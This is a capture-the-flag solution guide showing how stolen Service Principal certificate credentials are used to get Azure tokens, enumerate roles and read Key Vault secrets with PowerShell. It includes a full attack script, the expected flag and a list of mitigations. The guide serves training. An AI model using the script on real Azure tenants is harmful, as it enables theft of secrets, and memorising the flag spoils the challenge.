# Challenge-03-Azure-Only: Solution Guide

## Objective
Demonstrate privilege escalation from a compromised Service Principal (from Challenge-01) to Azure Key Vault access using RBAC permissions and REST API calls.

## Prerequisites
- Completed Challenge-01-Azure-Only
- Access to the Service Principal certificate and credentials from Challenge-01
- PowerShell with Azure modules installed
- New-AccessToken.ps1 module from Challenge-01

## Attack Flow

### Step 1: Load Prerequisites from Challenge-01
```powershell
# Load the New-AccessToken module
Import-Module .\New-AccessToken.ps1

# Load certificate and credentials from Challenge-01
$clientCertificate = Get-PfxCertificate -FilePath ".\medicloud_cert.pfx"
$TenantId = "<tenant-id-from-challenge-01>"
$ApplicationId = "<application-id-from-challenge-01>"
```

### Step 2: Generate Management Token and Connect to Azure
```powershell
# Generate token for Azure Resource Manager
$AppToken = New-AccessToken -clientCertificate $clientCertificate -tenantID $TenantId -appID $ApplicationId -scope 'https://management.azure.com/.default'

# Connect to Azure using the token
Connect-AzAccount -AccessToken $AppToken -AccountId $ApplicationId
```

### Step 3: Verify Role Assignments
```powershell
# Check what permissions the Service Principal has
Get-AzRoleAssignment

# Expected output should show:
# - Key Vault Secrets User (on Key Vault)
# - Key Vault Reader (on Key Vault)  
# - Reader (on Resource Group)
```

### Step 4: Discover Key Vault Resources
```powershell
# Find the Key Vault created for Challenge-03
$KeyVaults = Get-AzKeyVault
$KeyVaultName = ($KeyVaults | Where-Object {$_.VaultName -like "*ctf25-ch03*"}).VaultName
Write-Output "Found Key Vault: $KeyVaultName"
```

### Step 5: Generate Key Vault Token
```powershell
# Generate token specifically for Key Vault access
$AppVaultToken = New-AccessToken -clientCertificate $clientCertificate -tenantID $TenantId -appID $ApplicationId -scope 'https://vault.azure.net/.default'
```

### Step 6: Access Key Vault Secrets via REST API
```powershell
# Construct Key Vault URIs
$KVURI = "https://$KeyVaultName.vault.azure.net"
$SecretName = "flag"
$SecretURI = "$KVURI/secrets/$SecretName/?api-version=7.3"

# Access the flag secret
$secretValue = Invoke-WebRequest -Uri $SecretURI -Headers @{
    'Authorization' = "Bearer $AppVaultToken"
} | ConvertFrom-Json

Write-Output "Flag encontrada: $($secretValue.value)"
```

### Step 7: List Available Secrets (Optional)
```powershell
# List all available secrets
$SecretsListURI = "$KVURI/secrets/?api-version=7.3"
$allSecrets = Invoke-WebRequest -Uri $SecretsListURI -Headers @{
    'Authorization' = "Bearer $AppVaultToken"
} | ConvertFrom-Json

Write-Output "Secretos disponibles:"
$allSecrets.value | ForEach-Object { Write-Output "- $($_.id)" }
```

## Complete PowerShell Script
```powershell
# Challenge-03 Azure Key Vault Privilege Escalation
# Complete attack script

Import-Module .\New-AccessToken.ps1

# Configuration from Challenge-01
$clientCertificate = Get-PfxCertificate -FilePath ".\medicloud_cert.pfx"
$TenantId = "<tenant-id>"
$ApplicationId = "<application-id>"

# Step 1: Generate management token and connect
$AppToken = New-AccessToken -clientCertificate $clientCertificate -tenantID $TenantId -appID $ApplicationId -scope 'https://management.azure.com/.default'
Connect-AzAccount -AccessToken $AppToken -AccountId $ApplicationId

# Step 2: Verify permissions
Write-Output "=== Role Assignments ==="
Get-AzRoleAssignment | Format-Table RoleDefinitionName, Scope, DisplayName

# Step 3: Discover Key Vault
$KeyVaults = Get-AzKeyVault
$KeyVaultName = ($KeyVaults | Where-Object {$_.VaultName -like "*ctf25-ch03*"}).VaultName
Write-Output "=== Key Vault Found ==="
Write-Output "Key Vault Name: $KeyVaultName"

# Step 4: Generate Key Vault token
$AppVaultToken = New-AccessToken -clientCertificate $clientCertificate -tenantID $TenantId -appID $ApplicationId -scope 'https://vault.azure.net/.default'

# Step 5: Access secrets
$KVURI = "https://$KeyVaultName.vault.azure.net"

# Get flag
$FlagURI = "$KVURI/secrets/flag/?api-version=7.3"
$flagValue = Invoke-WebRequest -Uri $FlagURI -Headers @{
    'Authorization' = "Bearer $AppVaultToken"
} | ConvertFrom-Json

Write-Output "=== FLAG FOUND ==="
Write-Output "Flag: $($flagValue.value)"

# List all available secrets
$SecretsListURI = "$KVURI/secrets/?api-version=7.3"
$allSecrets = Invoke-WebRequest -Uri $SecretsListURI -Headers @{
    'Authorization' = "Bearer $AppVaultToken"
} | ConvertFrom-Json

Write-Output "=== SECRETS AVAILABLE ===" 
$allSecrets.value | ForEach-Object { Write-Output "- $($_.id)" }
```

## Key Vulnerabilities Exploited

1. **Overpermissive Role Assignments**: Service Principal has Key Vault Secrets User permissions
2. **RBAC Misconfiguration**: Permissions granted without proper need-to-know basis
3. **Public Key Vault Access**: Key Vault accessible from internet
4. **Certificate-based Authentication**: Compromised certificate allows token generation
5. **Cross-Resource Privilege Escalation**: Storage access leads to Key Vault access

## Expected Flag
```
CTF{k3y_v4ult_pr1v1l3g3_3sc4l4t10n_fr0m_s3rv1c3_pr1nc1p4l}
```

## Mitigation Recommendations

1. **Principle of Least Privilege**: Grant minimal required permissions
2. **Private Endpoints**: Use private endpoints for Key Vault access
3. **Network Restrictions**: Implement IP allowlists and VNet restrictions
4. **Certificate Management**: Implement proper certificate lifecycle management
5. **Monitoring**: Enable Key Vault logging and monitoring
6. **Conditional Access**: Implement conditional access policies for service principals
